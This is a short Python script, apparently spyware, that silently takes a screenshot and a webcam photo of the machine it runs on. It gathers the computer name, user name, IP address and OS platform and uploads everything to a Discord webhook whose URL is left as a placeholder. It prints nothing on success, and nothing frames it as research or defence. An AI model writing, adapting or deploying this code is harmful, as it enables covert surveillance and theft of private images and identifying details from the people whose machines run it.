import os
import sys
import requests
import socket
import cv2
from io import BytesIO
from PIL import ImageGrab
from discord_webhook import DiscordWebhook, DiscordEmbed

def get_ip_address():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

def screenshot():
    img = ImageGrab.grab()
    return img

def capture_webcam():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()
    if ret:
        return cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
    else:
        return None

def send_screenshot_to_discord(webhook_url):
    img = screenshot()
    webcam_img = capture_webcam()

    with BytesIO() as img_byte:
        img.save(img_byte, 'PNG')
        img_byte.seek(0)

        computer_name = os.environ['COMPUTERNAME']
        user_name = os.environ['USERNAME']
        ip_address = get_ip_address()
        os_name = f"{sys.platform}"
        title = f"{computer_name} - {user_name} - {ip_address}"
        description = f"OS Platform : {os_name}"
        
        webhook = DiscordWebhook(url=webhook_url)
        embed = DiscordEmbed(title=title, description=description, color='03b2f8')
        webhook.add_embed(embed)
        webhook.add_file(file=img_byte.read(), filename='0x48523.png')

        if webcam_img is not None:
            _, buffer = cv2.imencode('.png', webcam_img)
            webcam_byte = BytesIO(buffer)
            webhook.add_file(file=webcam_byte.read(), filename='0x48522.png')

        response = webhook.execute()
        return response.status_code

webhook_url = "WEBHOOK_HERE"
status_code = send_screenshot_to_discord(webhook_url)

if status_code == 200:
    print("")
else:
    print("Failed to send: {}".format(status_code))
